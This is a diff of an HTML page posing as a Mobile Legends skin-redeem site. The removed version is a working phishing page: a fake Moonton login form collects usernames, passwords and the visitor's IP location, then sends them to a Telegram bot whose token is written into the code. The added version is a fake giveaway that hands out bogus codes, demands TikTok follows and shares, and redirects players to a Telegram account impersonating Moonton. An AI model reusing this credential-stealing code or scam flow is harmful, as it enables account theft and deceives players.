@@ -1,240 +1,200 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Redeem Code MLBB & Login</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>MLBB Skin Redeem</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
-      background: linear-gradient(135deg, #1e2a78, #00c6ff);
-      font-family: 'Arial', sans-serif;
+      font-family: 'Poppins', sans-serif;
+      background: radial-gradient(circle at top, #0f2027, #203a43, #2c5364);
+      color: white;
       margin: 0;
-      height: 100vh;
+      padding: 0;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      color: white;
-      overflow: hidden;
-      flex-direction: column;
     }
-
     .container {
-      display: flex;
-      justify-content: space-between;
-      background: rgba(0, 0, 0, 0.7);
-      border-radius: 15px;
-      padding: 40px;
+      background: rgba(255, 255, 255, 0.06);
+      padding: 35px;
+      border-radius: 20px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.37);
+      backdrop-filter: blur(15px);
       width: 90%;
-      max-width: 800px;
-      box-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
-      transition: transform 0.3s ease-in-out;
+      max-width: 400px;
+      text-align: center;
+      animation: fadeIn 1s ease forwards;
     }
-
-    .container:hover {
-      transform: scale(1.05);
-    }
-
-    img {
-      width: 70%;
-      max-width: 320px;
+    h2 {
       margin-bottom: 20px;
-      transition: transform 0.3s ease;
+      font-weight: 600;
+      font-size: 24px;
     }
-
-    img:hover {
-      transform: rotate(10deg);
-    }
-
-    .redeem-section, .login-section {
-      width: 45%;
-    }
-
     input {
       width: 100%;
-      padding: 12px;
-      margin: 12px 0;
-      border-radius: 10px;
-      border: 2px solid #ffb400;
-      background: transparent;
-      color: white;
-      font-size: 16px;
-      transition: all 0.3s ease;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #ffcc00;
-    }
-
-    button {
-      background: #ffb400;
-      color: black;
-      padding: 15px;
-      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
       border: none;
-      border-radius: 10px;
-      font-size: 18px;
-      cursor: pointer;
-      transition: all 0.3s ease;
+      border-radius: 12px;
+      font-size: 16px;
+      outline: none;
+      background: #ffffff10;
+      color: #fff;
     }
-
-    button:hover {
-      background: #ffcc00;
-      transform: scale(1.05);
-    }
-
-    #response {
-      margin-top: 20px;
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #00ffc3;
+      color: #000;
+      border: none;
+      border-radius: 12px;
       font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.3s ease;
     }
-
-    .redeem-section input {
-      background: #2a2d58;
+    button:hover {
+      background: #00cc9f;
     }
-
-    .login-section input {
-      background: #1c1f3f;
+    .note, #tiktokInstructions p {
+      font-size: 0.9em;
+      color: #ccc;
+      margin-top: 15px;
     }
-
-    @media (max-width: 600px) {
-      .container {
-        flex-direction: column;
-        padding: 25px;
-        width: 90%;
-      }
-
-      .redeem-section, .login-section {
-        width: 100%;
-        margin-bottom: 20px;
-      }
-
-      img {
-        width: 100%;
-      }
+    .skin-image {
+      width: 100%;
+      max-width: 250px;
+      margin: 20px auto;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+    .hidden {
+      display: none;
+    }
+    #clickBtn {
+      margin-top: 15px;
+      background: #ff007f;
+      color: white;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-  <div style="text-align: center; padding: 40px; background-color: blue;">
-  <img src="https://i.ibb.co.com/LX4pJkxm/images-4.jpg" alt="MLBB Logo" style="width: 200px;">
-  <h1 style="color: #00ffff; text-shadow: 2px 2px 5px #007bff; font-family: Arial, sans-serif; margin-top: 20px;">
-    Mobile Legends X NARUTO 
-  </h1>
-</div>
 
-  <div class="container">
-    <div class="redeem-section" id="redeem-section">
-      <h2>Redeem Code MLBB</h2>
-      <input type="text" id="userId" placeholder="ID MLBB">
-      <input type="text" id="zoneId" placeholder="Zone ID">
-      <input type="text" id="redeemCode" placeholder="Kode Redeem">
-      <button onclick="redeemCode()">Redeem</button>
-      <div id="redeem-response"></div>
+  <!-- Input Form -->
+  <div class="container" id="formCard">
+    <h2>MLBB Skin Redeem</h2>
+    <input type="text" id="playerId" placeholder="Enter Player ID" />
+    <input type="text" id="zoneId" placeholder="Enter Zone ID" />
+    <button onclick="generateCode()">Get Random Skin</button>
+  </div>
+
+  <!-- Result Display -->
+  <div class="container hidden" id="resultCard">
+    <h2>Congratulations!</h2>
+    <img id="skinImage" class="skin-image" src="" alt="Skin Image">
+    <p id="codeGiven">Redeem Code: -</p>
+    <p id="playerInfo">Player ID: -</p>
+
+    <div id="tiktokInstructions">
+      <p>To continue, please:</p>
+      <ol style="text-align: left; font-size: 14px; color: #ddd;">
+        <li>Follow our TikTok account</li>
+        <li>Watch our latest TikTok video</li>
+        <li>Comment and share the video</li>
+      </ol>
+      <a href="https://www.tiktok.com/@phanhaha7" target="_blank" style="color:#00ffc3; text-decoration: underline;">Go to TikTok</a>
+      <br><br>
+      <label style="display:block; margin-top:10px;">
+        <input type="checkbox" id="confirmFollowWatchCommentShare" /> I have followed, watched, commented, and shared
+      </label>
+      <button onclick="confirmAction()" id="confirmBtn" style="margin-top:15px;">Continue</button>
     </div>
 
-    <div class="login-section" id="login-section" style="display: none;">
-      <h2>Login Moonton</h2>
-      <input type="text" id="username" placeholder="Username">
-      <input type="password" id="password" placeholder="Password">
-      <button onclick="submitLogin()">Login</button>
-      <div id="login-response"></div>
-    </div>
+    <p class="note">You will be redirected shortly after completing the task.</p>
   </div>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = "7788665747:AAH_HIsff4i7lUqbWbH9fuuSbPkvKQwPVes";
-    const TELEGRAM_CHAT_ID = "7137150704";
-
-    function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: "HTML"
-        })
-      }).catch(err => console.error("Telegram Error:", err));
-    }
-
-    async function getIPInfo() {
-      try {
-        const res = await fetch("http://ip-api.com/json/");
-        const data = await res.json();
-        return {
-          ip : data.query,
-          city : data.city,
-          country : data.country,
-          as : data.as
-        };
-      } catch (err) {
-        return { ip: "Unknown", city: "Unknown", country: "Unknown", org: "Unknown" };
+    const codes = {
+      "narutocodeyou": {
+        name: "Lukas - Naruto Uzumaki",
+        image: "https://images.openai.com/thumbnails/2fa317ecc287d7b8284e91ce99b05f5a.jpeg" // Gambar Naruto
+      },
+      "sasukecoderedeem": {
+        name: "Suyou - Sasuke Uchiha",
+        image: "https://images.openai.com/thumbnails/46625248714ed88dfc94ec6ccfe4c269.jpeg" // Gambar Sasuke
+      },
+      "sakuracoderedemm": {
+        name: "Kalea - Sakura Haruno",
+        image: "https://images.openai.com/thumbnails/bccc20f5f2bc141636baf4049db79f1d.jpeg" // Gambar Sakura
+      },
+      "JKL321": {
+        name: "Hayabusa - Kakashi Hatake",
+        image: "https://images.openai.com/thumbnails/a634ed8b52b3b42ae0fee81d7f83d573.jpeg" // Gambar Kakashi
       }
+    };
+
+    const telegramUsername = "Moonton027";
+    const websiteURL = "https://www.tiktok.com/@phanhaha7";
+
+    function getRandomCode() {
+      const keys = Object.keys(codes);
+      return keys[Math.floor(Math.random() * keys.length)];
     }
 
-    async function redeemCode() {
-      const userId = document.getElementById("userId").value;
-      const zoneId = document.getElementById("zoneId").value;
-      const redeemCodeValue = document.getElementById("redeemCode").value;
-      const redeemResponse = document.getElementById("redeem-response");
+    function generateCode() {
+      const playerId = document.getElementById("playerId").value.trim();
+      const zoneId = document.getElementById("zoneId").value.trim();
 
-      if (!userId || !zoneId || !redeemCodeValue) {
-        redeemResponse.innerText = "Harap isi semua kolom redeem.";
-        redeemResponse.style.color = "orange";
+      if (!playerId || !zoneId) {
+        alert("Please enter both Player ID and Zone ID.");
         return;
       }
 
-      if (redeemCodeValue === "NARUTOSKIN" || redeemCodeValue === "NARUTOXMLBB") {
-        redeemResponse.innerText = "Kode berhasil diklaim! Hadiah akan dikirim.";
-        redeemResponse.style.color = "lightgreen";
-        setTimeout(() => {
-          document.getElementById("redeem-section").style.display = "none";
-          document.getElementById("login-section").style.display = "block";
-        }, 2000);
-      } else {
-        redeemResponse.innerText = "Kode tidak valid atau telah digunakan.";
-        redeemResponse.style.color = "red";
-      }
+      const code = getRandomCode();
+      const skinData = codes[code];
 
-      window.redeemData = { userId, zoneId, redeemCodeValue }; // simpan untuk dipakai di login
+      document.getElementById("formCard").classList.add("hidden");
+      document.getElementById("resultCard").classList.remove("hidden");
+      document.getElementById("skinImage").src = skinData.image;
+      document.getElementById("codeGiven").innerText = `Redeem Code: ${code}`;
+      document.getElementById("playerInfo").innerText = `Player ID: ${playerId} (${zoneId})`;
     }
 
-    async function submitLogin() {
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      const loginResponse = document.getElementById("login-response");
+    function confirmAction() {
+      const confirmed = document.getElementById("confirmFollowWatchCommentShare").checked;
 
-      if (!username || !password) {
-        loginResponse.innerText = "Harap isi semua kolom.";
-        loginResponse.style.color = "orange";
+      if (!confirmed) {
+        alert("Please confirm that you have followed, watched, commented, and shared the post.");
         return;
       }
 
-      const ipInfo = await getIPInfo();
-      const { userId, zoneId, redeemCodeValue } = window.redeemData || {};
+      document.getElementById("tiktokInstructions").innerHTML = "<p>Thank you! You’ll be redirected shortly...</p>";
 
-      const message = `<b>Data Login dan Redeem MLBB</b>
+      const playerId = document.getElementById("playerId").value.trim();
+      const zoneId = document.getElementById("zoneId").value.trim();
+      const code = document.getElementById("codeGiven").innerText.split(": ")[1];
 
-<b>Login Info</b>
-Username: <code>${username}</code>
-Password: <code>${password}</code>
+      // Redirect to Telegram
+      setTimeout(() => {
+        const message = encodeURIComponent(`Hello admin, I just redeemed MLBB skin with code: ${code}`);
+        window.location.href = `https://t.me/${telegramUsername}?text=${message}`;
+      }, 3000);
 
-<b>Redeem Info</b>
-ID: <code>${userId || '-'}</code>
-Zone: <code>${zoneId || '-'}</code>
-Code: <code>${redeemCodeValue || '-'}</code>
-
-<b>IP Info</b>
-IP: <code>${ipInfo.ip}</code>
-City: <code>${ipInfo.city}</code>, ${ipInfo.country}
-ISP: <code>${ipInfo.as}</code>`;
-
-      sendToTelegram(message);
-
-      loginResponse.innerText = `Login berhasil! Selamat datang, ${username}.`;
-      loginResponse.style.color = "lightgreen";
+      // Redirect to TikTok/Website
+      setTimeout(() => {
+        const finalURL = `${websiteURL}?code=${code}&id=${playerId}&zone=${zoneId}`;
+        window.location.href = finalURL;
+      }, 8000);
     }
   </script>
 
 </body>
-</html>
+  </html>
